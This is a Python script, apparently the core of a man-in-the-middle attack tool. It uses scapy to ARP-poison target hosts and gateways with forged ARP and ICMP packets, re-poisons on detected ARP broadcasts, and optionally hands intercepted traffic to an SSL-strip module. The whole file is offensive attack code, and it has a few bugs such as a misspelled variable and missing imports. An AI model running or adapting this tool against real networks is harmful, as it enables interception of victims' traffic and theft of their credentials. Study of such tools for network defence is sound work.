import threading
import ssl_strip
import packet_sniffer
import argparse
import time
from scapy.all import *
from ipaddress import ip_address
load_layer("http")
load_layer("dns")


lock = threading.Lock()

ARP_STORM_DELAY = 10          # milliseconds
ARP_POISON_SMART = 0          # boolean
ARP_POISON_WARM_UP = 1        # seconds
ARP_POISON_DELAY = 10         # seconds
ARP_POISON_ICMP = 1           # boolean
ARP_POISON_REPLY = 1          # boolean
ARP_POISON_REQUEST = 0        # boolean
ARP_POISON_EQUAL_MAC = 1      # boolean
DHCP_LEASE_TIME = 1800        # seconds
PORT_STEAL_DELAY = 10         # seconds
PORT_STEAL_SEND_DELAY = 2000  # microseconds


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", type=ip_address, dest="targets", required=True, nargs="+", help="Array of target IPs")  # if you want to be able to add more
    parser.add_argument("-g", "--gateway", type=ip_address, dest="gateways", required=True, nargs="+", help="Array of gateway IPs")
    parser.add_argument("-i", "--iface", dest="iface", default="enp0s3", help="Interface [default: %(default)s]")

    parser.add_argument("-o", "--oneway", dest="oneway", action="store_true", help="Do not poison gateways")
    parser.add_argument("-z", "--silent", dest="silent", action="store_true", help="Enable silent poisoning")

    parser.add_argument("-d", "--dns", dest="dns-spoof", action='store_true', help="use this argument if you want to use dns-spoof")
    parser.add_argument("-u", "--url", dest="urls", nargs="+", help="Array of URLs to spoof with as last item the the ip to redirect to")

    parser.add_argument("-s", "--ssl", dest="ssl_strip", action='store_true', help="use this argument if you want to use ssl-strip")

    parser.add_argument("-v", "--verbose", dest="verbose", action='store_true', help="use this argument if you want to use verbose mode")
    options = parser.parse_args()
    return options


options = get_arguments()


def get_mac(ip):
    arp_request_broadcast = build_ether("ff:ff:ff:ff:ff:ff")/ARP(pdst=ip)  # Broadcast MAC address: ff:ff:ff:ff:ff:ff
    # Get list with answered hosts
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False, iface=options.iface)[0]
    return answered_list[0][1].hwsrc if len(answered_list) > 0 else 0


def build_ether(mac):
    ether = Ether()
    ether.src = mac
    return ether


def build_icmp_echo():
    icmp = ICMP()
    return icmp


def build_arp(victim_ip, from_ip, from_mac, attacker_mac, mode):
    arp = ARP()
    arp.hwsrc = attacker_mac
    arp.psrc = victim_ip
    arp.hwdst = from_mac
    arp.pdst = from_ip
    arp.op = mode  # 1 for request, 2 for reply
    return arp


def forge_l2_ping(victim_ip, from_ip, from_mac):
    # ping = build_ether(macVictim) / IP(dst=ipVictim) / build_icmp_echo()
    ping = Ether(src=ATTACKER_MAC, dst=from_mac)/IP(src=victim_ip, dst=from_ip)/ICMP()
    return ping


def forge_arp(victim_ip, from_ip, from_mac, attacker_mac, mode):
    # arp = build_ether(macVictim) / IP(dst=ipVictim) / build_icmp_echo()
    arp = build_ether(attacker_mac)/build_arp(victim_ip, from_ip, from_mac, attacker_mac, mode)
    return arp


def arp_poison(targets, gateways):
    i = 0

    while True:
        try:
            print("[*] Sending ARP poison packets...") if options.verbose else 0

            for victim_address in targets:
                for from_address in gateways:
                    if(victim_address == from_address):
                        print("[*] Skipping same IPs...") if options.verbose else 0
                        continue

                    icmp = forge_l2_ping(from_address.ip, victim_address.ip, victim_address.mac)
                    sendp(icmp, iface=options.iface, verbose=options.verbose)
                    if(not options.oneway):
                        icmpM = forge_l2_ping(victim_address.ip, from_address.ip, from_address.mac)
                        sendp(icmpM, iface=options.iface, verbose=options.verbose)

                    # Create ARP poison packet to send all packets from from_address to this pc if packet is for victim
                    arp = forge_arp(from_address.ip, victim_address.ip, victim_address.mac, ATTACKER_MAC, 2)
                    sendp(arp, iface=options.iface, verbose=options.verbose)

                    arp[ARP].op = 1
                    sendp(arp, iface=options.iface, verbose=options.verbose)
                    if(not options.oneway):
                        arpM = forge_arp(vitcim_address.ip, from_address.ip, from_address.mac, ATTACKER_MAC, 2)
                        sendp(arpM, iface=options.iface, verbose=options.verbose)

                        arpM[ARP].op = 1
                        sendp(arpM, iface=options.iface, verbose=options.verbose)

            print("[*] end of ARP storm...") if options.verbose else 0
            if(options.silent and i >=2):
                print("Initial poison complete")
                return

        except Exception as e:
            print(e, traceback.format_exc())
            sys.exit(0)

        time.sleep(ARP_POISON_WARM_UP)
        i += 1


def poison_confirm(targets, gateways):
    while True:
        pkt = sniff(filter="arp", iface=options.iface, count=1)[0]
        for target in targets:
            if(pkt[ARP].psrc == target.ip):
                for gateway in gateways:
                    if(pkt[ARP].pdst == gateway.ip):
                        print("ARP broadcast detected")
                        pkt.show()
                        arpReply = forge_arp(gateway.ip, target.ip, target.mac, ATTACKER_MAC, 2)
                        sendp(arpReply, iface=options.iface, verbose=options.verbose)

            if(not options.oneway):
                if(pkt[ARP].pdst == target.ip):
                    for gateway in gateways:
                        if(pkt[ARP].psrc == gateway.ip):
                            arpReply = forge_arp(target.ip, gateway.ip, gateway.mac, ATTACKER_MAC, 2)
                            sendp(arpReply, iface=options.iface, verbose=options.verbose)

        # print("[*] Received ARP packet:")
        # pkt.show()
        # print()


def main():
    try:
        global ATTACKER_IP
        ATTACKER_IP = get_if_addr(options.iface)
    except TypeError:
        print("[!] Error: Interface not found")
        sys.exit(0)
    global ATTACKER_MAC
    ATTACKER_MAC = get_if_hwaddr(options.iface)

    targets = []
    gateways = []

    for targetAdr in options.targets:
        target = format(targetAdr)
        target_mac = get_mac(target)
        if(target_mac == 0):
            print("[!] MAC of Target: {} not found".format(target))
            sys.exit(0)
        targets.append(type('obj', (object,), {"mac": target_mac, "ip": target}))

    for gatewayAdr in options.gateways:
        gateway = format(gatewayAdr)
        gateway_mac = get_mac(gateway)
        if(gateway_mac == 0):
            print("[!] MAC of Gateway: {} not found".format(gateway))
            sys.exit(0)
        gateways.append(type('obj', (object,), {"mac": gateway_mac, "ip": gateway}))

    # gateways.append((get_mac(options.target), options.target))
    # gateways.append((get_mac(options.gateway), options.gateway))

    print("[*] Target IP: " + targets[0].ip)
    print("[*] Target MAC: " + targets[0].mac)
    print("[*] Gateway IP: " + gateways[0].ip)
    print("[*] Gateway MAC: " + gateways[0].mac)

    print("[*] Attacker IP: " + ATTACKER_IP)
    print("[*] Attacker MAC: " + ATTACKER_MAC)

    print("[*] Starting ARP poison thread...")

    # use daemon=True to run in background and stop when application quits
    poison_thread = threading.Thread(target=arp_poison, args=(targets, gateways), daemon=True).start()
    poison_confirm_thread = threading.Thread(target=poison_confirm, args=(targets, gateways), daemon=True).start()

    time.sleep(ARP_POISON_WARM_UP)

    if(options.ssl_strip):
        print("[*] Starting SSL strip thread...")
        vic = targets + gateways

        packet_sniffer.main(ssl_strip.check_packet, vic, ATTACKER_MAC, options)

    # wait for ctrl+c to exit application
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
        sys.exit(0)


if __name__ == "__main__":
    main()
